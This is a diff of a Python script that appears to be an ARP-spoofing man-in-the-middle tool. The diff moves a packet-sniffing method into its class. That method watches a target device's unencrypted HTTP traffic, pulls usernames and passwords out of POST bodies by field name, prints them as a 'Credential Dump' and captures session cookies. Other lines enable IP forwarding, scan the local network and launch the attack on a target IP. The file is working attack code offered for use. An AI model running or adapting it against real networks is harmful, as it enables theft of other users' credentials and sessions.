@@ -12,6 +12,7 @@ import ctypes
 import subprocess
 import requests
 import re
+import urllib.parse
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -63,68 +64,66 @@ class Device:
         sniff(iface=self.iface, prn=arp_pkt_callback,
               filter=f'arp and host {self.targetip}', store=0)
 
-    import urllib.parse
+    def http_sniff(self):
+        def http_pkt_callback(pkt):
+            if pkt.haslayer('Raw'):
+                raw_data = pkt['Raw'].load.decode(errors='ignore')
+                login_fields = ['heslo', 'passwd', 'pwd', 'user_id', 'pseudonym', 'phone',
+                                'password', 'user', 'username', 'login', 'pass', 'uname','userPass']
+                creds_found = {}
+                url = "unknown"
+                show_dump = False
 
-def http_sniff(self):
-    def http_pkt_callback(pkt):
-        if pkt.haslayer('Raw'):
-            raw_data = pkt['Raw'].load.decode(errors='ignore')
-            login_fields = ['heslo', 'passwd', 'pwd', 'user_id', 'pseudonym', 'phone',
-                            'password', 'user', 'username', 'login', 'pass', 'uname','userPass']
-            creds_found = {}
-            url = "unknown"
-            show_dump = False
+                # Decode URL-encoded characters
+                raw_data = urllib.parse.unquote(raw_data)
 
-            # Decode URL-encoded characters
-            raw_data = urllib.parse.unquote(raw_data)
+                # Extract Host and Path for full URL
+                if "Host:" in raw_data and "GET" in raw_data:
+                    try:
+                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                        path = raw_data.split("GET ")[1].split(" HTTP")[0]
+                        url = f"http://{host}{path}"
+                        print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
+                    except Exception:
+                        pass
 
-            # Extract Host and Path for full URL
-            if "Host:" in raw_data and "GET" in raw_data:
-                try:
-                    host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                    path = raw_data.split("GET ")[1].split(" HTTP")[0]
-                    url = f"http://{host}{path}"
-                    print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
-                except Exception:
-                    pass
+                elif "Host:" in raw_data and "POST" in raw_data:
+                    try:
+                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                        path = raw_data.split("POST ")[1].split(" HTTP")[0]
+                        url = f"http://{host}{path}"
+                    except Exception:
+                        pass
 
-            elif "Host:" in raw_data and "POST" in raw_data:
-                try:
-                    host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                    path = raw_data.split("POST ")[1].split(" HTTP")[0]
-                    url = f"http://{host}{path}"
-                except Exception:
-                    pass
+                if "POST" in raw_data:
+                    # Lowercase search for login keywords
+                    for field in login_fields:
+                        regex = re.compile(rf'{field}=([^&\s]+)', re.IGNORECASE)
+                        match = regex.search(raw_data)
+                        if match:
+                            creds_found[field.lower()] = match.group(1)
+                            show_dump = True
 
-            if "POST" in raw_data:
-                # Lowercase search for login keywords
-                for field in login_fields:
-                    regex = re.compile(rf'{field}=([^&\s]+)', re.IGNORECASE)
-                    match = regex.search(raw_data)
-                    if match:
-                        creds_found[field.lower()] = match.group(1)
-                        show_dump = True
+                    if show_dump:
+                        login = "-"
+                        pwd = "-"
+                        for key in creds_found:
+                            if key in ['user', 'username', 'login', 'uname', 'user_id', 'pseudonym', 'phone']:
+                                login = creds_found[key]
+                            if key in ['password', 'pass', 'pwd', 'passwd', 'heslo']:
+                                pwd = creds_found[key]
 
-                if show_dump:
-                    login = "-"
-                    pwd = "-"
-                    for key in creds_found:
-                        if key in ['user', 'username', 'login', 'uname', 'user_id', 'pseudonym', 'phone']:
-                            login = creds_found[key]
-                        if key in ['password', 'pass', 'pwd', 'passwd', 'heslo']:
-                            pwd = creds_found[key]
+                        print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    IP: {self.targetip} > LOGIN: {login}  PWD: {pwd}  SITE: {url}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    CONTENT: {raw_data.strip().replace(chr(13), '').replace(chr(10), '')}{Style.RESET_ALL}")
 
-                    print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
-                    print(f"{Fore.GREEN}    IP: {self.targetip} > LOGIN: {login}  PWD: {pwd}  SITE: {url}{Style.RESET_ALL}")
-                    print(f"{Fore.GREEN}    CONTENT: {raw_data.strip().replace(chr(13), '').replace(chr(10), '')}{Style.RESET_ALL}")
+                if "Set-Cookie:" in raw_data:
+                    cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
+                    print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
 
-            if "Set-Cookie:" in raw_data:
-                cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
-                print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
+        sniff(iface=self.iface, prn=http_pkt_callback,
+              filter=f'tcp port 80 and host {self.targetip}', store=0)
 
-    sniff(iface=self.iface, prn=http_pkt_callback,
-          filter=f'tcp port 80 and host {self.targetip}', store=0)
-    
     def enable_ip_forwarding(self):
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
         print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
@@ -194,23 +193,21 @@ def arp_scan(network, iface):
         try:
             vendor = MacLookup().lookup(mac)
         except VendorNotFoundError:
-            vendor = 'unrecognized device'
-        devices.append((ip, mac, vendor))
-        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
-    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
-    return input('\nPick a device IP: ')
+            vendor = 'unidentified'
+        print(f'{Fore.GREEN}IP: {ip} MAC: {mac} Vendor: {vendor}{Style.RESET_ALL}')
+        devices.append({'ip': ip, 'mac': mac, 'vendor': vendor})
+    return devices
 
 if __name__ == '__main__':
-    while True:
-        targetip = arp_scan(opts.network, opts.iface)
-        if targetip == "0":
-            print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
+    devices = arp_scan(opts.network, opts.iface)
+    for device in devices:
+        if device['ip'] == opts.routerip:
+            router_mac = device['mac']
             break
-        device = Device(opts.routerip, targetip, opts.iface)
-        device.enable_ip_forwarding()
-        device.set_iptables()
-        try:
-            device.sniff()
-        except KeyboardInterrupt:
-            print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
-            continue
+    target_device = next(d for d in devices if d['ip'] == opts.targetip)
+
+    # Create and run the device for sniffing
+    target = Device(opts.routerip, opts.targetip, opts.iface)
+    target.enable_ip_forwarding()
+    target.set_iptables()
+    target.sniff()
